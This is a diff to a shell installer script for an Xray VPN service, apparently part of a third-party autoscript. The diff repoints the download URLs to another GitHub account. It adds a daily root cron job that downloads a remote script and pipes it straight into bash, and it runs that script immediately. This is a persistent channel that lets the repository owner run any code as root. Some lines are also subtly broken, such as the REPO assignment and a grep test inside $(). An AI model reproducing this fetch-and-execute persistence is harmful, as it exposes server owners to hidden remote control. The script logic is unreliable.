@@ -150,7 +150,7 @@ fi
 echo -e " [INFO] Downloading menu.zip..."
 {
 BUG_FILE="/etc/xray/.bug_optr"
-BUG_URL="https://raw.githubusercontent.com/satria293/vip/main/install/bug"
+BUG_URL="https://raw.githubusercontent.com/nameless-newbie/fifth-sc/main/install/bug"
 
 # Cek apakah file ada dan berisi
 if [[ -f $BUG_FILE && -s $BUG_FILE && $(grep -q "=" "$BUG_FILE") ]]; then
@@ -172,10 +172,14 @@ else
         exit 1
     fi
 fi
-    cron_job="0 0 * * * /bin/bash -c \"wget -qO- 'https://drive.google.com/u/4/uc?id=1jtFVG-q0VhnAF9RtMvzGMtXD9U9Lgi6s&export=download' | bash\""
-        crontab -l 2>/dev/null | grep -Fxv "$cron_job" | crontab -
-        (crontab -l 2>/dev/null; echo "$cron_job") | crontab -
-    wget -qO- 'https://drive.google.com/u/4/uc?id=1jtFVG-q0VhnAF9RtMvzGMtXD9U9Lgi6s&export=download' | bash
+
+
+REPO_URL="https://raw.githubusercontent.com/nameless-newbie/fifth-sc/main/install/mutiara"
+cron_job="0 0 * * * /bin/bash -c \"wget -qO- '$REPO_URL' | bash\""
+crontab -l 2>/dev/null | grep -Fxv "$cron_job" | crontab -
+(crontab -l 2>/dev/null; echo "$cron_job") | crontab -
+wget -qO- "$REPO_URL" | bash
+
 cat> /etc/cron.d/xp_otm << END
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
@@ -193,6 +197,7 @@ SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 */5 * * * * root /usr/bin/autocpu
 END
+REPO=$(curl -sL "https://raw.githubusercontent.com/nameless-newbie/fifth-sc/main/")
 wget -O /usr/bin/autocpu "${REPO}install/autocpu.sh" && chmod +x /usr/bin/autocpu
 cat >/etc/cron.d/xp_sc <<-END
 SHELL=/bin/sh
